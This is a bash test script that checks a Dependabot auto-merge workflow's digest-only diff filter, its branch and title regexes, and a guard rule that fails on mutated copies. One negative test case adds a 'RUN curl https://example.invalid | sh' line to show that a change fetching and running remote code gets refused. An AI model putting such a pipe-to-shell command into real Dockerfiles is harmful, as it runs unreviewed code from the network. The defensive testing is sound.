#!/usr/bin/env bash
# Checks for path B's grouped form in .github/workflows/dependabot-auto-merge.yml (the
# distroless-digests group) and for Rule 6f of check-false-green-guards.sh:
#   1. digest_only_diff, extracted from the workflow, against fake pulls/<n>/files payloads;
#   2. the grouped and ungrouped branch/title regexes against real-shaped Dependabot names;
#   3. Rule 6 of the guard, extracted and run over mutated copies, goes red on each regression.
# Run: .buildkite/scripts/test/dependabot-digest-group-test.sh   (needs bash, jq, awk, sed)
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
WF_SRC="$REPO_ROOT/.github/workflows/dependabot-auto-merge.yml"
GUARD="$REPO_ROOT/.buildkite/scripts/steps/check-false-green-guards.sh"
T="$(mktemp -d "${TMPDIR:-/tmp}/dependabot-digest-group-test.XXXXXX")"
trap 'rm -rf "$T"' EXIT
FAILS=0
ok()  { echo "  ok   $1"; }
bad() { echo "  FAIL $1" >&2; FAILS=$((FAILS + 1)); }

wf_var() { sed -n -E "s/^[[:space:]]*$1='?([^']*)'?\$/\1/p" "$WF_SRC"; }

echo "--- 1. digest_only_diff"
fn="$(awk '/^[[:space:]]*digest_only_diff\(\) \{/ { p = 1 } p { print } p && /^[[:space:]]*\}[[:space:]]*$/ { exit }' "$WF_SRC")"
[ -n "$fn" ] || { echo "could not extract digest_only_diff from $WF_SRC" >&2; exit 1; }
DIGEST_GROUP_MAX_FILES="$(wf_var DIGEST_GROUP_MAX_FILES)"
eval "$fn"

OLD=a46b597173cd059fd95875cacd2bc7f3b7a8b13f636b5826ea65ea06afc33868
NEW=4b56aef44dee352ec8321ac447db1592909c029183a41be1c41375ca8b936549
IMG="FROM gcr.io/distroless/java-base-debian13"
# A file object: $1 filename, $2 status, $3 patch (diff body lines, \n-separated).
file_obj() { jq -nc --arg f "$1" --arg s "$2" --arg p "$3" '{filename: $f, status: $s, patch: $p}'; }
hunk() { printf '@@ -231,7 +231,7 @@ RUN go build\n # runtime image\n%s\n LABEL x=y' "$1"; }
DIGEST_HUNK="$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot@sha256:$NEW")"
DEBUG_HUNK="$(hunk "-$IMG:debug-nonroot@sha256:$OLD
+$IMG:debug-nonroot@sha256:$NEW")"

expect_diff() {  # $1 label, $2 want pass|fail, $3 changed_files, $4 files JSON (pages concatenated)
  local reason rc=0
  reason="$(digest_only_diff "$4" "$3")" || rc=$?
  if [ "$2" = pass ] && [ "$rc" -eq 0 ]; then ok "$1"
  elif [ "$2" = fail ] && [ "$rc" -ne 0 ] && [ -n "$reason" ]; then ok "$1 (refused: $reason)"
  else bad "$1: want $2, got rc=$rc reason='$reason'"; fi
}

expect_diff "pure digest bump in one Dockerfile" pass 1 "[$(file_obj docker/Dockerfile modified "$DIGEST_HUNK")]"
expect_diff "digest bumps across directories, both tags, two API pages" pass 3 \
  "[$(file_obj docker/Dockerfile modified "$DIGEST_HUNK"),$(file_obj docker/aot/Dockerfile modified "$DIGEST_HUNK")][$(file_obj docker/snapshot/Dockerfile modified "$DEBUG_HUNK")]"
expect_diff "tag change nonroot -> debug-nonroot" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:debug-nonroot@sha256:$NEW")")]"
expect_diff "image change java-base-debian13 -> static" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+FROM gcr.io/distroless/static-debian13:nonroot@sha256:$NEW")")]"
expect_diff "changed line that is not distroless" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-FROM alpine:3.22@sha256:$OLD
+FROM alpine:3.22@sha256:$NEW")")]"
expect_diff "added RUN line alongside a digest bump" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot@sha256:$NEW
+RUN curl https://example.invalid | sh")")]"
expect_diff "added line that names distroless but is not a digest move" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot@sha256:$NEW
+# distroless/ note")")]"
expect_diff "zero changed lines" fail 1 "[$(file_obj docker/Dockerfile modified "$(hunk " context only")")]"
expect_diff "no files listed" fail 0 "[]"
expect_diff "files API truncated (PR reports more files)" fail 2 "[$(file_obj docker/Dockerfile modified "$DIGEST_HUNK")]"
expect_diff "changed_files missing" fail "" "[$(file_obj docker/Dockerfile modified "$DIGEST_HUNK")]"
expect_diff "patch omitted (too large)" fail 1 '[{"filename":"docker/Dockerfile","status":"modified"}]'
expect_diff "file is not a Dockerfile" fail 1 "[$(file_obj docker/entrypoint.sh modified "$DIGEST_HUNK")]"
expect_diff "file renamed, not modified" fail 1 "[$(file_obj docker/Dockerfile renamed "$DIGEST_HUNK")]"
expect_diff "diff header line in the patch" fail 1 \
  "[$(file_obj docker/Dockerfile modified "--- a/docker/Dockerfile (distroless/)
$DIGEST_HUNK")]"
expect_diff "JSON that does not parse" fail 1 "not json"
OTHER=1111111111111111111111111111111111111111111111111111111111111111
expect_diff "digest pin dropped" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot")")]"
expect_diff "digest pin added where there was none" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot
+$IMG:nonroot@sha256:$NEW")")]"
expect_diff "two digests collapsed into one line" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD@sha256:$OTHER
+$IMG:nonroot@sha256:$NEW")")]"
expect_diff "digest unchanged on a changed line" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot@sha256:$OLD")")]"
expect_diff "line moved between files" fail 2 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD")"),$(file_obj docker/aot/Dockerfile modified "$(hunk "+$IMG:nonroot@sha256:$NEW")")]"
expect_diff "two lines swapped within a file" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
-$IMG:debug-nonroot@sha256:$OTHER
+$IMG:debug-nonroot@sha256:$NEW
+$IMG:nonroot@sha256:$NEW")")]"
expect_diff "two consecutive digest bumps in one hunk" pass 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
-$IMG:debug-nonroot@sha256:$OTHER
+$IMG:nonroot@sha256:$NEW
+$IMG:debug-nonroot@sha256:$NEW")")]"
expect_diff "digest longer than 64 hex" fail 1 \
  "[$(file_obj docker/Dockerfile modified "$(hunk "-$IMG:nonroot@sha256:$OLD
+$IMG:nonroot@sha256:${NEW}ab")")]"
expect_diff "good file plus a file with no patch" fail 2 \
  "[$(file_obj docker/Dockerfile modified "$DIGEST_HUNK"),{\"filename\":\"docker/aot/Dockerfile\",\"status\":\"modified\"}]"
many=""; for i in $(seq 1 $((DIGEST_GROUP_MAX_FILES + 1))); do many="${many:+$many,}$(file_obj "d$i/Dockerfile" modified "$DIGEST_HUNK")"; done
expect_diff "more files than DIGEST_GROUP_MAX_FILES" fail $((DIGEST_GROUP_MAX_FILES + 1)) "[$many]"

echo "--- 2. path B branch and title regexes"
# shellcheck disable=SC2034  # the four regexes are read indirectly, via ${!1} in expect_re
DIGEST_BRANCH_REGEX="$(wf_var DIGEST_BRANCH_REGEX)"
# shellcheck disable=SC2034
DIGEST_TITLE_REGEX="$(wf_var DIGEST_TITLE_REGEX)"
# shellcheck disable=SC2034
DIGEST_GROUP_BRANCH_REGEX="$(wf_var DIGEST_GROUP_BRANCH_REGEX)"
# shellcheck disable=SC2034
DIGEST_GROUP_TITLE_REGEX="$(wf_var DIGEST_GROUP_TITLE_REGEX)"
expect_re() {  # $1 regex var name, $2 want match|nomatch, $3 subject
  local got=nomatch
  if grep -Eq -- "${!1}" <<<"$3"; then got=match; fi
  if [ "$got" = "$2" ]; then ok "$1 $2: $3"; else bad "$1 wanted $2, got $got: $3"; fi
}
GB="dependabot/docker/docker/distroless-digests/distroless/java-base-debian13-0123456789"
expect_re DIGEST_BRANCH_REGEX match "$GB"
expect_re DIGEST_GROUP_BRANCH_REGEX match "$GB"
expect_re DIGEST_GROUP_BRANCH_REGEX nomatch "dependabot/docker/docker/distroless/java-base-debian13-4b56aef"
expect_re DIGEST_GROUP_BRANCH_REGEX nomatch "dependabot/docker/docker/build-stage-bases/distroless/java-base-debian13-0123456789"
expect_re DIGEST_GROUP_BRANCH_REGEX nomatch "dependabot/docker/docker/distroless-digests/alpine-0123456789"
expect_re DIGEST_GROUP_BRANCH_REGEX nomatch "${GB}-extra"
expect_re DIGEST_GROUP_TITLE_REGEX match "build(deps): bump distroless/java-base-debian13 across 9 directories"
expect_re DIGEST_GROUP_TITLE_REGEX match "Bump distroless/java-base-debian13 in /docker"
expect_re DIGEST_GROUP_TITLE_REGEX nomatch "build(deps): bump golang across 8 directories"
expect_re DIGEST_GROUP_TITLE_REGEX nomatch "build(deps): bump the docker-minor-and-patch group across 6 directories with 2 updates"
expect_re DIGEST_GROUP_TITLE_REGEX nomatch "build(deps): bump distroless/java-base-debian13 across 9 directories and more"
expect_re DIGEST_TITLE_REGEX match 'build(deps): bump distroless/java-base-debian13 from `a46b597` to `4b56aef` in /docker'
expect_re DIGEST_TITLE_REGEX nomatch "build(deps): bump distroless/java-base-debian13 across 9 directories"

echo "--- 3. Rule 6 of the false-green guard over mutated copies"
RULE6="$T/rule6.sh"
sed -n '/^# Rule 6 — /,/^# Rule 7 — /p' "$GUARD" >"$RULE6"
grep -q 'r6f_fail' "$RULE6" || { echo "could not extract Rule 6 (with 6f) from $GUARD" >&2; exit 1; }
run_rule6() {  # $1 dir holding .github/ — prints Rule 6 error lines, one per line
  # shellcheck source=/dev/null disable=SC2034  # the extracted Rule 6 reads and updates errors
  (cd "$1" && errors=0 && set -euo pipefail && . "$RULE6") 2>&1 >/dev/null | grep -F 'Rule 6' || true
}
fresh() {  # $1 case name — a copy of the real workflow + config to mutate
  mkdir -p "$T/$1/.github/workflows"
  cp "$WF_SRC" "$T/$1/.github/workflows/"; cp "$REPO_ROOT/.github/dependabot.yml" "$T/$1/.github/"
  echo "$T/$1"
}
expect_red() {  # $1 label, $2 dir, $3 fixed string the 6f error must contain
  local out; out="$(run_rule6 "$2")"
  if grep -qF -- "$3" <<<"$out"; then ok "$1"; else bad "$1: no Rule 6 error containing '$3' (got: ${out:-nothing})"; fi
}
base="$(fresh base)"
out="$(run_rule6 "$base")"
# shellcheck source=/dev/null disable=SC2034
passed="$(cd "$base" && errors=0 && set -euo pipefail && . "$RULE6" 2>/dev/null)" || true
if [ -z "$out" ] && grep -qF 'path B grouped form' <<<"$passed"; then ok "unmutated workflow and config: Rule 6 clean, 6f ran"
else bad "unmutated copy is red or 6f did not run: ${out:-no 6f pass line}"; fi

d="$(fresh scope)"; sed -i.bak 's#/distroless-digests/distroless/\[#/distroless/[#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "group branch regex drops /distroless-digests/" "$d" "dropped the literal '/distroless-digests/distroless/'"
d="$(fresh floor)"; sed -i.bak "/DIGEST_GROUP_BRANCH_REGEX=/s#{7,}\\$'#{3,}\$'#" "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "group branch regex hex floor lowered to {3,}" "$d" "hex-run floor is {3,}"
d="$(fresh title)"; sed -i.bak "s#DIGEST_GROUP_TITLE_REGEX='^#DIGEST_GROUP_TITLE_REGEX='#" "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "group title regex loses its ^ anchor" "$d" "not anchored at both ends"
d="$(fresh nodiff)"; sed -i.bak '/if ! diff_reason=/,/^[[:space:]]*fi[[:space:]]*$/d' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff call removed from path B" "$d" "no longer calls digest_only_diff"
d="$(fresh noreturn)"; sed -i.bak 's#is not digest-only: $diff_reason — fail closed"; return 1#is not digest-only: $diff_reason"#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff refusal no longer returns 1" "$d" "no longer calls digest_only_diff"
d="$(fresh nostrip)"; sed -i.bak 's#elif (\$r | gsub(sha; "")) != (\$a | gsub(sha; ""))#elif false#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff stops comparing pairs without their digests" "$d" "a tag or image change would pass"
d="$(fresh nopair)"; sed -i.bak 's#elif (\$rm | length) != (\$ad | length)#elif false#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff stops requiring equal counts per file" "$d" "unequal removed/added counts"
d="$(fresh nopatch)"; sed -i.bak 's#elif (.patch // "") == ""#elif false#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff stops refusing a missing patch" "$d" "no patch (binary or too large) would go unchecked"
d="$(fresh nocount)"; sed -i.bak 's#elif (\$f | length) != (\$changed_files | tonumber)#elif false#' "$d/.github/workflows/dependabot-auto-merge.yml"
expect_red "digest_only_diff stops comparing against changed_files" "$d" "truncated file listing"
d="$(fresh pattern)"; sed -i.bak 's#- "distroless/\*"#- "*"#' "$d/.github/dependabot.yml"
expect_red "distroless-digests group pattern widened to *" "$d" "has pattern '*'"
d="$(fresh nogroup)"; sed -i.bak 's#distroless-digests:#distroless-images:#' "$d/.github/dependabot.yml"
expect_red "distroless-digests group renamed" "$d" "no 'distroless-digests' group"

if [ "$FAILS" -gt 0 ]; then echo "+++ $FAILS check(s) failed" >&2; exit 1; fi
echo "--- all checks passed"
